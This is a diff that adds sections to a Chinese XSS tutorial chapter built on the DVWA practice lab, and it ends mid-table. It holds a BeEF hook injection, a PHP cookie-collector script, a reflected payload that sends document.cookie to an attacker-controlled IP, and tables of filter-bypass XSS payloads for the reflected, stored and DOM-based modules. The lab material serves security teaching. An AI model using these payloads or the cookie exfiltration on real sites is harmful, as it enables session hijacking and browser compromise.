@@ -150,6 +150,200 @@ DOM型XSS就是这样的：
 
 ---
 
+### 📍 本章 3 个 XSS 模块 · 三平台访问地址对照（别跑错门！）
+
+DVWA 里 XSS 一共分 **3 个子模块**（反射型 / 存储型 / DOM 型），下面这张表请收藏，打哪个模块就进哪个地址。**尤其是 Docker 版没有 /dvwa 这一层路径，别复制错了！**
+
+| 模块名称（左侧菜单） | 🪟 Windows PHPStudy | 🐧 **Kali Linux LAMP（你在用 ✅ 最推荐）** | 🐳 Docker 版（端口 4280 · 拉不动看 ch04 §4.5/§4.7 ✅） |
+|---|---|---|---|
+| **XSS (Reflected)** · 反射型（URL 里藏 payload） | `http://localhost/dvwa/vulnerabilities/xss_r/` | `http://你的KaliIP/dvwa/vulnerabilities/xss_r/`<br>例：`http://192.168.42.135/dvwa/vulnerabilities/xss_r/` | `http://你的KaliIP:4280/vulnerabilities/xss_r/` |
+| **XSS (Stored)** · 存储型（留言板存数据库） | `http://localhost/dvwa/vulnerabilities/xss_s/` | `http://你的KaliIP/dvwa/vulnerabilities/xss_s/`<br>例：`http://192.168.42.135/dvwa/vulnerabilities/xss_s/` | `http://你的KaliIP:4280/vulnerabilities/xss_s/` |
+| **XSS (DOM)** · DOM 型（锚点 # 绕过白名单） | `http://localhost/dvwa/vulnerabilities/xss_d/` | `http://你的KaliIP/dvwa/vulnerabilities/xss_d/`<br>例：`http://192.168.42.135/dvwa/vulnerabilities/xss_d/` | `http://你的KaliIP:4280/vulnerabilities/xss_d/` |
+| **Kali 专用利器 🔥** | Burp Suite（手动改包） | **BeEF XSS 框架 + Burp + cookie-editor 插件** | Kali 本机用 Beef + Docker 容器做靶（Docker 拉不动直接用 Kali LAMP ✅） |
+
+> 🔎 **怎么查你 Kali 的 IP？** 打开终端执行：`ip -4 a | grep "inet " | grep -v 127.0.0.1`，输出里那一串 192.168.x.x / 10.x.x.x 就是。
+
+---
+
+### 🗺️ 图 11-1 XSS 三类攻击全景流程图（反射 vs 存储 vs DOM）
+
+下面这张图帮你一眼看清 **三种 XSS 的数据流到底差在哪**——上面是反射型（URL → 服务器 → 受害者），中间是存储型（payload 存进数据库，**所有访问者都中招**），下面是 DOM 型（全程不经过服务器，只在浏览器里作妖）：
+
+<svg viewBox="0 0 1160 620" width="100%" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:1020px;margin:18px auto;display:block;border:1px solid #2a2a3a;border-radius:14px;background:#0f1120;">
+  <defs>
+    <linearGradient id="xss-row1" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#1f6feb"/><stop offset="100%" stop-color="#0b3b8a"/></linearGradient>
+    <linearGradient id="xss-row2" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#da3633"/><stop offset="100%" stop-color="#7a1515"/></linearGradient>
+    <linearGradient id="xss-row3" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#8957e5"/><stop offset="100%" stop-color="#421f8c"/></linearGradient>
+    <linearGradient id="xss-server" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#2a3556"/><stop offset="100%" stop-color="#151a30"/></linearGradient>
+    <marker id="xss-ar1" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#4490ff"/></marker>
+    <marker id="xss-ar2" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#f85149"/></marker>
+    <marker id="xss-ar3" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#a371f7"/></marker>
+  </defs>
+  <text x="580" y="32" text-anchor="middle" fill="#fff" font-size="20" font-weight="bold" font-family="Arial">图 11-1  XSS 三类攻击全景对比 · 反射型（上） 存储型（中） DOM 型（下）</text>
+  <!-- 第一行：反射型 XSS -->
+  <g font-family="Arial">
+    <rect x="20"  y="54" width="1120" height="158" rx="14" fill="url(#xss-row1)" stroke="#4490ff" stroke-width="1.4"/>
+    <text x="84" y="78" fill="#fff" font-weight="bold" font-size="15">💫 ① 反射型 XSS（Reflected）· 点链接才中招</text>
+    <!-- 攻击者 -->
+    <rect x="40" y="92" width="170" height="106" rx="10" fill="#000" opacity="0.35" stroke="#4490ff"/>
+    <text x="125" y="118" text-anchor="middle" fill="#cfe1ff" font-weight="bold">😈 攻击者（Kali 里）</text>
+    <text x="52"  y="142" fill="#e6efff" font-size="12">构造恶意 URL：</text>
+    <text x="52"  y="162" fill="#ffe16b" font-size="12">/xss_r/?name=&lt;script&gt;steal()&lt;/script&gt;</text>
+    <text x="52"  y="184" fill="#a0c4ff" font-size="12">→ 发邮件 / 发聊天链接骗用户点</text>
+    <!-- 箭头 -->
+    <line x1="210" y1="145" x2="300" y2="145" stroke="#4490ff" stroke-width="2" marker-end="url(#xss-ar1)"/>
+    <text x="255" y="138" text-anchor="middle" fill="#a0c4ff" font-size="11">① 点链接</text>
+    <!-- 受害者浏览器 -->
+    <rect x="302" y="92" width="200" height="106" rx="10" fill="#000" opacity="0.35" stroke="#4490ff"/>
+    <text x="402" y="118" text-anchor="middle" fill="#cfe1ff" font-weight="bold">🧑‍💻 受害者浏览器</text>
+    <text x="316" y="142" fill="#e6efff" font-size="12">请求 URL（带 payload）</text>
+    <line x1="502" y1="125" x2="582" y2="125" stroke="#4490ff" stroke-width="2" marker-end="url(#xss-ar1)"/>
+    <text x="542" y="118" text-anchor="middle" fill="#a0c4ff" font-size="11">② 发请求</text>
+    <!-- 服务器 -->
+    <rect x="584" y="92" width="220" height="106" rx="10" fill="url(#xss-server)" stroke="#4c5a8a"/>
+    <text x="694" y="118" text-anchor="middle" fill="#cfe1ff" font-weight="bold">🖥️ DVWA 服务器(Apache+PHP)</text>
+    <text x="596" y="142" fill="#e6efff" font-size="12">直接把 name 参数拼到 HTML 里</text>
+    <text x="596" y="162" fill="#ffe16b" font-size="12">echo "Hello ".$_GET['name'];</text>
+    <text x="596" y="184" fill="#ff9898" font-size="12">❌ 没过滤！原样返回</text>
+    <line x1="584" y1="168" x2="502" y2="168" stroke="#ff9898" stroke-width="2" marker-end="url(#xss-ar1)"/>
+    <text x="542" y="182" text-anchor="middle" fill="#ff9898" font-size="11">③ 返回含 script 的 HTML</text>
+    <!-- 返回受害者：执行脚本 -->
+    <line x1="302" y1="168" x2="212" y2="168" stroke="#ff6b6b" stroke-width="2.2" marker-end="url(#xss-ar1)" stroke-dasharray="5 4"/>
+    <text x="255" y="195" text-anchor="middle" fill="#ff6b6b" font-size="11">④ 浏览器执行 → Cookie 被偷 🍪</text>
+  </g>
+  <!-- 第二行：存储型 XSS -->
+  <g font-family="Arial">
+    <rect x="20"  y="226" width="1120" height="158" rx="14" fill="url(#xss-row2)" stroke="#ff6b6b" stroke-width="1.4"/>
+    <text x="84" y="250" fill="#fff" font-weight="bold" font-size="15">💾 ② 存储型 XSS（Stored）· 一次注入，永久伤害 ⚠️ 危害最高</text>
+    <rect x="40" y="264" width="170" height="106" rx="10" fill="#000" opacity="0.35" stroke="#f85149"/>
+    <text x="125" y="290" text-anchor="middle" fill="#ffd7d7" font-weight="bold">😈 攻击者（Kali 留言）</text>
+    <text x="52"  y="314" fill="#ffeaea" font-size="12">在 DVWA 留言板提交：</text>
+    <text x="52"  y="334" fill="#ffe16b" font-size="12">&lt;img src=x onerror=steal()&gt;</text>
+    <text x="52"  y="356" fill="#ffb0b0" font-size="12">存入数据库（guestbook 表）💥</text>
+    <line x1="210" y1="314" x2="300" y2="314" stroke="#f85149" stroke-width="2" marker-end="url(#xss-ar2)"/>
+    <text x="255" y="307" text-anchor="middle" fill="#ffb0b0" font-size="11">① POST 留言</text>
+    <rect x="302" y="264" width="220" height="106" rx="10" fill="url(#xss-server)" stroke="#4c5a8a"/>
+    <text x="412" y="290" text-anchor="middle" fill="#ffd7d7" font-weight="bold">🖥️ DVWA 服务器(PHP + MySQL)</text>
+    <text x="316" y="314" fill="#ffeaea" font-size="12">INSERT 留言进 guestbook 表</text>
+    <text x="316" y="334" fill="#ffe16b" font-size="12">❌ 完全没 htmlspecialchars</text>
+    <rect x="316" y="344" width="192" height="20" rx="5" fill="#2a0a0a" stroke="#ff6b6b"/>
+    <text x="412" y="359" text-anchor="middle" fill="#ffe16b" font-size="12" font-weight="bold">🗄️ MySQL dvwa.guestbook（存死了）</text>
+    <line x1="522" y1="314" x2="600" y2="314" stroke="#f85149" stroke-width="2" marker-end="url(#xss-ar2)"/>
+    <text x="561" y="307" text-anchor="middle" fill="#ffb0b0" font-size="11">② 以后每次 SELECT</text>
+    <rect x="602" y="264" width="200" height="106" rx="10" fill="#000" opacity="0.35" stroke="#f85149"/>
+    <text x="702" y="290" text-anchor="middle" fill="#ffd7d7" font-weight="bold">🧑‍💻 任何受害者浏览器</text>
+    <text x="616" y="314" fill="#ffeaea" font-size="12">正常打开留言板页面</text>
+    <text x="616" y="334" fill="#ffe16b" font-size="12">恶意脚本跟着留言一起显示</text>
+    <text x="616" y="356" fill="#ff9898" font-size="12">💥 每个人都自动执行！</text>
+    <line x1="802" y1="320" x2="884" y2="320" stroke="#ff6b6b" stroke-width="2.2" marker-end="url(#xss-ar2)" stroke-dasharray="5 4"/>
+    <text x="842" y="314" text-anchor="middle" fill="#ff9898" font-size="11">③ Cookie / 键盘记录 / 挂马</text>
+    <rect x="886" y="264" width="240" height="106" rx="10" fill="#2a0a0a" stroke="#ff6b6b"/>
+    <text x="1006" y="290" text-anchor="middle" fill="#ffd7d7" font-weight="bold">🥩 攻击者 Kali · BeEF 控制台 / XSS 平台</text>
+    <text x="898" y="314" fill="#ffeaea" font-size="12">🍪 Cookie 汇总（session 劫持）</text>
+    <text x="898" y="334" fill="#ffeaea" font-size="12">⌨️ 键盘记录 / 📸 页面截图</text>
+    <text x="898" y="356" fill="#ff9898" font-size="12">🎣 注入钓鱼登录框 · 重定向恶意站</text>
+  </g>
+  <!-- 第三行：DOM 型 XSS -->
+  <g font-family="Arial">
+    <rect x="20"  y="398" width="1120" height="204" rx="14" fill="url(#xss-row3)" stroke="#a371f7" stroke-width="1.4"/>
+    <text x="84" y="422" fill="#fff" font-weight="bold" font-size="15">🌲 ③ DOM 型 XSS · 服务器根本不知道！(High 用 #锚点 绕过服务端白名单 🔥)</text>
+    <rect x="40" y="436" width="230" height="152" rx="10" fill="#000" opacity="0.35" stroke="#a371f7"/>
+    <text x="155" y="462" text-anchor="middle" fill="#e3d0ff" font-weight="bold">😈 攻击者构造 URL（关键在 # 锚点）</text>
+    <text x="52"  y="490"  fill="#f0e4ff" font-size="12">High 级别（服务端白名单只看 default=English）：</text>
+    <text x="52"  y="512"  fill="#ffe16b" font-size="12">?default=English#&lt;/option&gt;&lt;img src=x onerror=alert(1)&gt;</text>
+    <rect x="52" y="522" width="206" height="56" rx="6" fill="#1a0b40" stroke="#a371f7"/>
+    <text x="68"  y="544" fill="#9effa0" font-size="12" font-weight="bold">✅ 服务端检查通过（default=English 白名单）</text>
+    <text x="68"  y="566" fill="#ffb8ff" font-size="12">⚠️ # 后面的内容 不会发到服务器！</text>
+    <line x1="270" y1="480" x2="350" y2="480" stroke="#a371f7" stroke-width="2" marker-end="url(#xss-ar3)"/>
+    <text x="310" y="473" text-anchor="middle" fill="#e3d0ff" font-size="11">受害者点击</text>
+    <rect x="352" y="436" width="300" height="152" rx="10" fill="url(#xss-server)" stroke="#4c5a8a"/>
+    <text x="502" y="462" text-anchor="middle" fill="#e3d0ff" font-weight="bold">🖥️ DVWA 服务器 —— 全程一脸懵 🤷</text>
+    <text x="366" y="490" fill="#f0e4ff" font-size="12">服务端 $_GET 只拿到 default=English</text>
+    <rect x="366" y="500" width="272" height="28" rx="6" fill="#0e4a1c" stroke="#3fb950"/>
+    <text x="502" y="520" text-anchor="middle" fill="#9effa0" font-size="13" font-weight="bold">✅ 白名单校验通过 · switch case English</text>
+    <text x="366" y="560" fill="#f0e4ff" font-size="12">服务器只返回正常 HTML + 原始 JS 代码</text>
+    <text x="366" y="580" fill="#ff9eff" font-size="12">🔒 #锚点里的恶意内容 · 服务器完全没看到！</text>
+    <line x1="652" y1="510" x2="730" y2="510" stroke="#a371f7" stroke-width="2" marker-end="url(#xss-ar3)"/>
+    <text x="691" y="503" text-anchor="middle" fill="#e3d0ff" font-size="11">返回静态 HTML+JS</text>
+    <rect x="732" y="436" width="280" height="152" rx="10" fill="#000" opacity="0.35" stroke="#a371f7"/>
+    <text x="872" y="462" text-anchor="middle" fill="#e3d0ff" font-weight="bold">🧑‍💻 受害者浏览器（真正出事的地方 💥）</text>
+    <text x="746" y="486" fill="#f0e4ff" font-size="12">① 前端 JS 读取完整 URL（含#锚点）：</text>
+    <text x="746" y="506" fill="#ffe16b" font-size="12">document.location.href 里是完整的 payload！</text>
+    <text x="746" y="528" fill="#f0e4ff" font-size="12">② JS 取 substring 拼到 document.write()：</text>
+    <text x="746" y="548" fill="#ff9eff" font-size="12">lang = URL.substring(indexOf("default=")+8)</text>
+    <text x="746" y="570" fill="#ff6bff" font-size="12" font-weight="bold">💥 &lt;/option&gt;闭合 + &lt;img onerror&gt; 成功执行！</text>
+    <line x1="1012" y1="510" x2="1094" y2="510" stroke="#ff6bff" stroke-width="2.2" marker-end="url(#xss-ar3)" stroke-dasharray="5 4"/>
+    <text x="1054" y="503" text-anchor="middle" fill="#ff9eff" font-size="11">发回 Kali · Beef 控制</text>
+  </g>
+</svg>
+
+---
+
+### 🔥 Kali 同学本章速查（BeEF + Cookie 劫持 · 直接复制改 IP）
+
+在 Kali 里玩 XSS，**弹窗（alert）只是新手玩具**，真正的玩法是把受害者勾进 **BeEF XSS 控制框架**（Kali 官方预装的），或者把 Cookie 发到你自己的接收端。下面两条命令直接上：
+
+#### ① 启动 BeEF（XSS 控制平台 · Kali 自带）
+
+```bash
+# Kali 默认已安装 beef-xss；没有就先装
+sudo apt install -y beef-xss
+
+# 启动 BeEF（首次会让你改 beef 用户密码，记下来）
+sudo beef-xss
+
+# 启动后看控制台输出：
+#   管理界面（你自己打开）：http://127.0.0.1:3000/ui/panel
+#   Hook 脚本（给受害者执行）：http://你的KaliIP:3000/hook.js
+#   登录账号：beef / 你刚才设的密码
+```
+
+#### ② DVWA 注入 BeEF Hook（让受害者自动被你控制 👻）
+
+把下面 payload 贴进 **DVWA XSS (Stored) 留言板 Message 框（Low 难度）**，以后每个打开留言板的人都会进你的 BeEF 僵尸网络：
+
+```html
+<script src="http://192.168.42.135:3000/hook.js"></script>
+```
+
+> ⚠️ 把 `192.168.42.135` 改成你 Kali 自己的 IP！
+
+#### ③ 最朴素的 Cookie 收信脚本（10 行 PHP，Kali Apache 直接跑）
+
+不想搭 Beef？用下面这个极简方案：
+
+```bash
+# 1. Kali 里建一个接收脚本
+sudo mkdir -p /var/www/html/xss/
+sudo tee /var/www/html/xss/steal.php << 'EOF'
+<?php
+if (isset($_GET['c'])) {
+    $line = date("Y-m-d H:i:s") . " | " . $_SERVER['REMOTE_ADDR'] . " | " . $_GET['c'] . PHP_EOL;
+    file_put_contents("/var/www/html/xss/cookies.log", $line, FILE_APPEND);
+}
+header("Content-Type: image/gif");
+echo base64_decode("R0lGODlhAQABAIAAAP///wAAACH5BAEAAAEALAAAAAABAAEAAAICTAEAOw==");
+EOF
+sudo chown -R www-data:www-data /var/www/html/xss/
+sudo chmod -R 775 /var/www/html/xss/
+
+# 2. 确认 Apache 开着
+sudo systemctl start apache2
+
+# 3. 查看被偷的 Cookie
+tail -f /var/www/html/xss/cookies.log
+```
+
+#### ④ 贴进 DVWA 的 payload（XSS Reflected Low 示例）
+
+```
+http://192.168.42.135/dvwa/vulnerabilities/xss_r/?name=<img src=x onerror="this.src='http://192.168.42.135/xss/steal.php?c='+document.cookie">
+```
+
+> ✅ **Docker 同学注意：** 如果你的 DVWA 是 `docker run -p 4280:80` 拉起的，把上面 URL 里的 `/dvwa/vulnerabilities/xss_r/` 改成 `:4280/vulnerabilities/xss_r/`，其他 payload 一模一样。
+
+---
+
 ## 反射型XSS实战（Reflected XSS）🎯
 
 好的，现在我们打开DVWA，选择"XSS (Reflected)"模块，开始我们的反射型XSS之旅！
@@ -400,6 +594,18 @@ if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
 
 > 💡 小知识：你看，只过滤`<script>`标签是远远不够的！HTML里能执行JavaScript的地方太多了，各种标签的事件属性都可以。所以防御XSS不能靠黑名单，得用更可靠的方法——这个我们后面讲防御的时候再说。
 
+### ✅ 表 11-1 · 反射型 XSS（Reflected XSS）Low/Medium/High 三级通关速查 & 失败对照表
+
+三种级别都是同一个输入框（What's your name? 提交 GET 参数 `name=`），一个接一个按下面 payload 测。**注意：Chrome 自带 XSS Auditor（老版本）/CSP 可能拦截弹窗 → 测试前一定换 Firefox 或 Chrome 开无痕 + 禁用 `chrome://flags/#enable-webui-xss-auditor` 或直接用 alert(document.domain) 试**
+
+| 难度 | 先干什么 | name 输入框里填什么（**逐字抄！标点符号英文！**） | 看到什么算这级通过 ✅ | **失败了怎么办？（按报错抄作业）** ❌ |
+|---|---|---|---|---|
+| 🟢 Low | 切难度到 low → Submit → 刷新 → 进入 XSS (Reflected) | ① 最简单经典：`<script>alert('XSS_Low_OK_'+document.cookie)</script>`（**注意 script 全小写，前后尖括号英文输入法！**）→ Submit | 浏览器弹弹窗，内容是 `XSS_Low_OK_PHPSESSID=...security=low` = Low 通过 ✅ | 【点 Submit 后页面显示 `Hello <script>alert(...) </script>` 没有弹窗！】→ 99% 新手踩坑：① 你用了中文尖括号 `＜script＞` 不是英文 `<script>`；② 浏览器 XSS Auditor 拦了 → 用 Firefox 测 / 或写 `<body onload=alert(1)>` 这种 Auditor 不拦的事件属性；③ CSP 拦截（控制台 F12 Console 报 Refused to execute inline script because it violates the following Content Security Policy directive）→ 这种情况用 `<img src=x onerror=alert(1)>` 有时能过，实在不行改靶场 Apache 响应头去掉 CSP |
+| 🟡 Medium | 切难度到 medium → Submit → 刷新 → 再进 Reflected XSS | 先拿 Low 的 `<script>alert(1)</script>` 试 → 应该失败！再按顺序试下面三个 payload，必中至少一个：<br>① **大小写绕过**：`<ScRipT>alert('XSS_Medium_CaseBypass')</ScRipT>`（DVWA Medium 用的 `str_replace('<script>' , '', $name)` 不递归 + 大小写敏感！）<br>② **双写绕过**：`<scr<script>ipt>alert('XSS_Medium_DoubleWrite')</scr<script>ipt>`（中间一个 `<script>` 被删掉，两边拼回 `<script>`）<br>③ **不用 script 标签**：`<img src=x onerror=alert(1)>` 或 `<svg onload=alert(document.domain)>` 任何事件属性 | 弹任意一个 alert = Medium 通关 ✅ | 【大小写/双写 全失败了？】→ ① 你 View Source 一下 Medium 源码是不是 `preg_replace('/<script/i', '', $name)`（有 i 修饰符 = 大小写不敏感！这种版本大小写和双写都直接废）→ 直接跳 ③ 不用 script 标签，img/svg/body 事件属性 100% 绕；② 你写成 `<scr<script>ipt>alert(1)</scr</script>ipt>`，闭合方式错了 → 严格写成 `<scr<script>ipt>...</scr<script>ipt>` 每侧多包 script 一次 |
+| 🔴 High | 切难度到 high → Submit → 刷新 | Low 的 `<script>` 标签法 + Medium 的双写/大小写 6 个 payload **全失败才对 = High 生效**。然后测：<br>① **事件属性大法（99% 能过！）**：`<img src=x onerror=alert('XSS_High_OK')>` 或 `<body onpageshow=alert('HighOnPageshow')>` 或 `<details open ontoggle=alert('HighToggle')>` （这些全不带 "script" 这个单词，正则 `/<script.*>/i` 根本匹配不到）<br>② 备选：`<a href="javascript:alert('hrefJS')">点我</a>`（用户点一下才弹，也算 XSS） | 出现 alert 弹窗 = High 通关 ✅🎉 | 【img onerror 也不弹？】→ F12 Console 看报什么错：① "Uncaught ReferenceError: alert is not defined"？不可能 → 那是你浏览器有插件屏蔽了 alert → 换 `confirm(1)` 或 `prompt('xss')` 测；② 页面显示 Hello 后 HTML 源码里尖括号被转义成 `&lt;` 和 `&gt;` → 你那 DVWA 是 fork 版本用了 htmlspecialchars，High 级别是真的 Impassible 写法！（那你先记录问题，看源码里是 `htmlspecialchars()` + ENT_QUOTES = 真编码，这种纯靠输出编码没法绕的。原版 DVWA High 应该是只过滤 `<script.*>` 正则，没有对 `<>` 编码，事件属性一定能过）|
+
+> 🔥 **反射型 XSS 查错总口诀（三级通用）：** 先拿 `<script>alert(1)</script>` 试看弹不弹 → 不弹就 F12 Elements 看渲染后的 HTML：**看到的尖括号还是 <> 就说明是"过滤标签"问题，换事件属性一定过；看到的已经是 &lt; 那就是被 htmlspecialchars 编码了，纯反射这条路基本走不通**。
+
 ---
 
 ### Impossible级别 - 几乎不可能攻破 ⚪
@@ -629,6 +835,18 @@ High级别和反射型的High差不多，也是用正则过滤了script相关的
 用`<img src=x onerror=alert(1)>`试试看？应该也能成功！
 
 思路都是一样的，就不重复啰嗦啦！你自己动手试试吧！🧪
+
+### ✅ 表 11-2 · 存储型 XSS（Stored XSS）Low/Medium/High 三级通关速查 & 失败对照表
+
+存储型是留言板 Guestbook，两个输入框：**Name（maxlength=10 前端长度限制，可抓包改 txtName）** + **Message（mtxMessage，长度通常不限）**。注意 High 以上还有 user_token（CSRF token），直接浏览器提交就行（表单自带），Burp 改要抓原请求把 token 带上。
+
+| 难度 | 先干什么 | 输入框 / Burp 里填什么（**逐字抄！英文标点！**） | 看到什么算这级通过 ✅ | **失败了怎么办？（按报错抄作业）** ❌ |
+|---|---|---|---|---|
+| 🟢 Low | 切 low → Submit → 刷新 → XSS (Stored) Guestbook | **先搞 Message 输入框（最简单，完全没过滤！）**：<br>Message 里填：`<script>alert('Stored_XSS_Low_message!'+document.cookie)</script>` → Name 随便写（比如 test）→ Sign Guestbook 提交；<br>然后再测 **Name 输入框**：<br>Name 里填 `<img src=x onerror=alert('LowName')>`（10字符以内不超 maxlength，超了就 Burp 改）→ Message 随便写 → 提交 | ① 提交后立即弹窗 1 次；② 以后**每刷一次 Guestbook 页面就又弹 1 次**（因为 XSS 存进数据库了！每次读出来就执行，这就是存储型和反射型最大的区别！）= Low 通关 ✅ | 【提交了刷新不弹窗？】→ F12 → 切 Application → Cookies → 看 PHPSESSID 还在不在，登录过期了会跳登录页；【页面只显示脚本代码，没执行？】→ 你填的字段里有中文尖括号！换英文输入法 `<>` 重写；【点 Sign Guestbook 没反应】→ 前端 JS 校验 Name 必须填，Message 必须填，两个都写了 |
+| 🟡 Medium | 切 medium → Submit → 刷新 → Guestbook → View Source 看过滤逻辑（message 被 strip_tags 或 htmlspecialchars？）| Medium 的经典坑 = **只过滤 Message，对 Name 字段几乎不设防（或者只做前端 maxlength）**，所以重点攻击 Name：<br>① Burp 抓包 → Intercept On → 浏览器里 Name 填 123，Message 填 456 → 点 Sign Guestbook → Burp 抓到 POST body，把 `txtName=123` 改成 → `txtName=<ScRipT>alert('MEDIUM_NAME_Bypass')</ScRipT>`（同时把 Content-Length 改大！不然会截断）→ Forward<br>② 如果 Name 也被正则过滤了，直接写事件属性：`txtName=<img src=x onerror=alert(1)>`（只有 29 字符，也短） | 提交后 Guestbook 再次弹窗，**且每次刷新都弹** = Medium 通关 ✅ | 【Burp Forward 后 Name 还是 123？】→ ① 你没改 Content-Length！改了 txtName 值的长度，Content-Length 也要对应改（比如 123 是 3 个字符，改成 `<ScRipT>alert(1)</ScRipT>` 是 30 字符，比原来多 27，Content-Length 就加 27）；② 或者用 Repeater Send 更省事（Send 时不需要手动算 Content-Length，Burp Repeater 会重算）；【Chrome 报 "XSS Auditor refused to execute script"】→ 换 Firefox，或者用 img onerror 这种不被 Auditor 拦的 payload |
+| 🔴 High | 切 high → Submit → 刷新 → Guestbook | Low/Medium 那 6 个 payload 现在全失败才对（High 对 name+message 都做了 `<script.*>` 正则过滤）。然后用**事件属性 + 攻击两个字段组合**：<br>① **攻击 Name 字段 + svg onload**（29字符刚好！maxlength 10 的版本会被拦 → 这时 Burp 改 txtName 突破 maxlength）：Name（Burp 改）→ `<svg onload=alert(1)>`（不要双引号，就 20 多字符）<br>② **攻击 Message 字段 + details toggle**：Message 填 `<details open ontoggle=alert('HighToggle')>` （都不带 "script" 单词）<br>③ 备选：`<a href="javascript:alert(document.domain)" target=_blank>看我看我</a>`（用户点一下才弹，也是存储型） | 任何一个字段注入成功、刷新 Guestbook 能重复弹窗 = High 通关 ✅🎉 | 【F12 Elements 看尖括号都变成了 &lt; / &gt; = htmlspecialchars ENT_QUOTES】→ 原版 DVWA High 应该不会全编码。你的版本是高难度 fork（比如加了 htmlspecialchars），那存储型这级没法纯输出绕；【我明明提交成功了但是再回来看留言没存上？】→ 数据库字段长度限制！Name 字段有的版本 SQL 定义是 `varchar(15)`，你填了 50 字符 = 被 SQL 截断了根本没存进去，找 Burp Repeater 里改个短点的 payload：`<p onmousemove=alert(1)>HOVER`（只有 30 字符左右，鼠标移过去才弹，也算 XSS）|
+
+> 💡 **存储型 XSS 查错总口诀：** 先 Message 简单的来 → 不行就转攻 Name（90% DVWA Medium 都是 Name 没防好）→ Name 被 maxlength 限制就 Burp 抓包改 txtName + 别忘了 Content-Length → 都不行就上 img/svg/details 事件属性。**每次都要刷新 Guestbook 再弹一次才算存储成功！只弹一次=其实是反射型！**
 
 ---
 
@@ -907,6 +1125,18 @@ High级别下，前端的JS代码有没有变化？我们来看看。
 其实这个思路是对的！利用锚点（`#`）来绕过服务端的检查，因为锚点内容不会发到服务器。具体怎么构造payload，就留给你自己去研究啦！这可是个很好的练习机会！💪
 
 > 💡 提示：你需要仔细看JS代码是怎么处理URL的，然后想办法让你的恶意代码被取到并且执行。多试试不同的构造方式，你一定能成功的！
+
+### ✅ 表 11-3 · DOM 型 XSS（DOM-Based XSS）Low/Medium/High 三级通关速查 & 失败对照表
+
+DOM 型 XSS 不经过服务端存储也不经过服务端反射处理后直接输出（纯前端 JS 自己取 `location.href` / `document.URL` 拼到 `innerHTML` 里！），所以：① F12 → Network 标签看不到 payload 发给服务器（服务端日志里也不会留下 payload 痕迹！这就是 DOM 型独特之处 = 服务端 WAF 完全看不见）；② 主要攻击入口是 GET 参数 `?default=`（前端 `<select>` 下拉框"选择语言"那个值，通过 URL 参数回显）。
+
+| 难度 | 先干什么 | URL 里写什么 / 改什么（**逐字抄，浏览器地址栏里直接敲**） | 看到什么算这级通过 ✅ | **失败了怎么办？（按报错抄作业）** ❌ |
+|---|---|---|---|---|
+| 🟢 Low | 切 low → Submit → 刷新 → XSS (DOM) | 浏览器地址栏里直接把 URL 末尾改成：<br>`?default=<script>alert('DOM_Low_OK')</script>` → 回车 | ① 页面直接弹窗 alert('DOM_Low_OK')；② F12 → Network 里**看不到 `<script>` 这个字符串出现在请求体里**（说明全在客户端拼的，服务端根本没收到 = DOM 型确认）✅ | 【没弹窗 / 下拉框选择的是 "English" 没变？】→ ① 你改的参数名错了，不是 `?lang=` 不是 `?lan=`，参数名一定是 `default=`！去 F12 Elements 搜 `document.URL` 或者 `?default=` 相关 JS 代码确认；② 有的版本默认文件是 index.php，URL 结尾必须是 `index.php?default=...` 不能光写目录；③ Chrome XSS Auditor 拦了 → 换成 `?default=<svg onload=alert(1)>` 或 Firefox |
+| 🟡 Medium | 切 medium → Submit → 刷新 → DOM XSS | Low 的 `<script>alert(1)</script>` 现在应该没反应。先 View Source / F12 Console 看过滤方式（通常是 `str_replace('<script>' , '' , $_GET['default'])` 不区分大小写的话大小写绕过，区分大小写的话双写绕过；或者正则 `/<script/i` 大小写不敏感直接废 script 标签）→ 按顺序测，必中：<br>① 大小写：`?default=<ScRiPt>alert('DOM_Med_Case')</ScRiPt>`<br>② 双写：`?default=<scr<script>ipt>alert('DOM_Med_DoubleWrite')</scr<script>ipt>`<br>③ script 被废就用事件：`?default=<svg onload=alert('DOM_Med_Svg')>` 或 `<img src=x onerror=alert(1)>`<br>④ 还不弹窗就用 select 选项：`?default=English></option><img src=x onerror=alert('MED_CloseOption')>`（把前一个 option 闭合，后面插入 img）| 任意一个 alert 弹出来 = Medium 通关 ✅ | 【3 个都不弹？F12 Elements 里找一下被塞进 innerHTML 那段代码】→ 你写的标签被 HTML 实体化了？DOM 型理论上不会啊 → 哦，前端 JS 用了 `textContent` 而不是 `innerHTML`？那就不是 DOM XSS 了，你切错靶场了 → 回 DVWA 主菜单确认点的是 XSS (DOM) 不是别的；【下拉框那行出现了标签但没执行 = F12 Elements 里能看到 `<svg onload=...>` 但就是不执行】→ SVG/IMG/DETAILS 事件属性都要求该元素真的被加入 DOM 树。如果 `innerHTML` 是把整个字符串塞进 option value 里的话，那得先闭合 option 标签！→ 用第 ④ 个 payload（`English></option>...`）先跳出来 |
+| 🔴 High | 切 high → Submit → 刷新 | 所有 Low/Medium 的 `<script>` / `ScRiPt` / `双写` / `<img...>` 直接写在 `?default=` 里现在都失败才对。**High 级别核心技巧：服务端对 `?default=` 做白名单（只能是 English / Spanish / German / French 中的一个），所以我们不能把 payload 写在 ? 后面（query string 会被服务端校验），但是可以写在 URL 锚点 `#` 后面！因为 URL 中 `#` 号开始的 fragment（锚点部分）** 绝对不会发给服务端**，前端 JS 里 `document.URL` 却可以读到完整 URL（包括 #xxx）** — 经典绕过法：<br>URL 改成：<br>`?default=English#<script>alert('DOM_HashBypass')</script>`<br>（?default=English 是给服务端校验的白名单值，# 后面的 payload 服务端完全看不到！直接进前端 JS 拼 DOM）<br>如果 script 也被前端正则过滤了，再试组合：<br>`?default=French#<svg onload=alert('DOM_High_Hash_SVG')>` | ① Network 里服务端请求只有 `default=English`，**`<script>` 那段在请求里完全看不到**（证明真的没出网络）；② 浏览器弹 DOM_HashBypass/DOM_High_Hash_SVG 的 alert = High 通关！🎉 | 【加了 # 也不弹？】→ 先去读前端 JS 源码里究竟取的是哪部分：F12 → Elements → Ctrl+F 搜 